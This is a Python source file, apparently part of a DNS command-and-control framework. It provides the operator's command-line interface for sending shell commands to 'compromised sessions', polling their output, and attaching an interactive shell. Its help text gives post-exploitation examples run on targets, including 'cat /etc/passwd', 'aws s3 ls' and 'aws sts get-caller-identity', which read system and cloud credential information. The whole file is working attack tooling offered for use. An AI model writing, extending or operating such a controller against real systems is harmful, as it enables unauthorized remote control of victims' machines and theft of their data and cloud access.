"""Session commands for interacting with compromised sessions."""

import time

import click

from c2.core.session_manager import SessionManager


@click.command()
@click.argument("command")
@click.option(
    "--session",
    "-s",
    required=True,
    help="Session ID to send command to",
)
def send(command, session):
    """
    Send a command to a compromised session.

    \b
    Examples:
      c2 send "whoami" -s sess_abc123
      c2 send "aws s3 ls" -s sess_abc123
      c2 send "cat /etc/passwd" --session sess_abc123
    """
    manager = SessionManager()

    if manager.queue_command(session, command):
        click.echo(f"[+] Command sent to session {session}: {command}")
    else:
        click.echo(f"[!] Failed to send command", err=True)
        raise SystemExit(1)


@click.command()
@click.option(
    "--session",
    "-s",
    required=True,
    help="Session ID to receive output from",
)
@click.option(
    "--wait",
    "-w",
    default=0,
    type=int,
    help="Wait up to N seconds for output (default: 0, no wait)",
)
@click.option(
    "--poll-interval",
    default=2,
    type=int,
    help="Polling interval in seconds when waiting (default: 2)",
)
def receive(session, wait, poll_interval):
    """
    Receive output from a compromised session.

    \b
    Examples:
      c2 receive -s sess_abc123
      c2 receive -s sess_abc123 --wait 30
      c2 receive -s sess_abc123 -w 15 --poll-interval 1
    """
    manager = SessionManager()
    last_output_id = 0
    start_time = time.time()
    got_output = False

    while True:
        outputs = manager.get_output(session, last_output_id)

        for output in outputs:
            click.echo(f"\n[Output {output['id']}] {output.get('timestamp', '')}")
            click.echo(output["data"])
            last_output_id = output["id"]
            got_output = True

        # If we got output or not waiting, exit
        if got_output or wait == 0:
            break

        # Check timeout
        elapsed = time.time() - start_time
        if elapsed >= wait:
            break

        # Wait before next poll
        time.sleep(poll_interval)

    if not got_output:
        click.echo("[*] No output available")


@click.command()
@click.argument("session")
def attach(session):
    """
    Attach to a session interactively.

    \b
    SESSION is the session ID to attach to (e.g., sess_abc123)

    \b
    Example:
      c2 attach sess_abc123
    """
    manager = SessionManager()
    last_output_id = 0

    click.echo(f"\n{'=' * 60}")
    click.echo("  DNS C2 Operator Shell")
    click.echo(f"{'=' * 60}")
    click.echo(f"  Session ID: {session}")
    click.echo(f"  C2 Server:  {manager.c2_server}")
    click.echo(f"  C2 Domain:  {manager.c2_domain}")

    # Check connection
    click.echo(f"\n[*] Checking C2 server connectivity...")
    if not manager.check_connection():
        click.echo(
            f"[!] Warning: Cannot reach C2 server at {manager.c2_server}", err=True
        )
        click.echo("[!] Make sure the DNS C2 server is running", err=True)

    click.echo(f"\n{'-' * 60}")
    click.echo("  Commands:")
    click.echo(f"{'-' * 60}")
    click.echo("   <command>  - Execute shell command on target")
    click.echo("   status     - Check for pending output")
    click.echo("   exit       - Quit (session stays active)")
    click.echo("   kill       - Terminate session and quit")
    click.echo("   help       - Show this help")
    click.echo(f"{'-' * 60}\n")

    try:
        while True:
            # Check for pending output
            outputs = manager.get_output(session, last_output_id)
            if outputs:
                for output in outputs:
                    click.echo(f"\n{'-' * 60}")
                    click.echo(f"  Output from {session}:")
                    click.echo(f"{'-' * 60}")
                    click.echo(output["data"])
                    click.echo(f"{'-' * 60}\n")
                    last_output_id = output["id"]

            # Get command
            try:
                cmd = click.prompt(f"c2:{session}", prompt_suffix="> ").strip()
            except (KeyboardInterrupt, EOFError):
                click.echo("\n[*] Exiting...")
                break

            if not cmd:
                continue

            if cmd.lower() == "exit":
                click.echo("[*] Exiting (session stays active)...")
                break

            elif cmd.lower() == "kill":
                click.echo(f"[*] Terminating session {session}...")
                if manager.terminate_session(session):
                    click.echo("[+] Session terminated")
                else:
                    click.echo("[!] Failed to terminate session")
                break

            elif cmd.lower() == "status":
                outputs = manager.get_output(session, last_output_id)
                if outputs:
                    for output in outputs:
                        click.echo(f"\n[Output {output['id']}]")
                        click.echo(output["data"])
                        last_output_id = output["id"]
                else:
                    click.echo("[*] No pending output")
                continue

            elif cmd.lower() == "help":
                click.echo("\n  Commands:")
                click.echo("   <command>  - Execute shell command on target")
                click.echo("   status     - Check for pending output")
                click.echo("   exit       - Quit (session stays active)")
                click.echo("   kill       - Terminate session and quit")
                click.echo("   help       - Show this help")
                click.echo("\n  Examples:")
                click.echo("   whoami")
                click.echo("   aws s3 ls")
                click.echo("   aws sts get-caller-identity")
                click.echo()
                continue

            else:
                # Send command
                click.echo(f"[>] Sending: {cmd}")
                if manager.queue_command(session, cmd):
                    click.echo("[+] Command queued")
                    click.echo("[*] Waiting for output...\n")

                    # Poll for output
                    start_time = time.time()
                    timeout = 30
                    got_output = False
                    cmd_output_id = last_output_id

                    try:
                        while time.time() - start_time < timeout:
                            outputs = manager.get_output(session, cmd_output_id)
                            if outputs:
                                for output in outputs:
                                    click.echo(f"{'-' * 60}")
                                    click.echo("  Output:")
                                    click.echo(f"{'-' * 60}")
                                    click.echo(output["data"])
                                    click.echo(f"{'-' * 60}\n")
                                    last_output_id = output["id"]
                                got_output = True
                                break
                            time.sleep(1)
                    except KeyboardInterrupt:
                        click.echo("\n[!] Stopped waiting\n")

                    if not got_output:
                        click.echo(f"[!] No output after {timeout}s")
                        click.echo("[*] Use 'status' to check later\n")
                else:
                    click.echo("[!] Failed to send command\n")

    except Exception as e:
        click.echo(f"\n[!] Error: {e}", err=True)

    click.echo(f"\n{'=' * 60}")
    click.echo(f"  Session: {session}")
    click.echo(f"  Status: Detached")
    click.echo(f"{'=' * 60}")
    click.echo(f"  To reattach: c2 attach {session}")
    click.echo(f"{'=' * 60}\n")


@click.command()
def status():
    """Check C2 server connectivity."""
    manager = SessionManager()

    click.echo(f"C2 Server: {manager.c2_server}")
    click.echo(f"C2 Domain: {manager.c2_domain}")
    click.echo()

    if manager.check_connection():
        click.echo("[+] C2 server is reachable")
    else:
        click.echo("[!] Cannot reach C2 server", err=True)
        raise SystemExit(1)
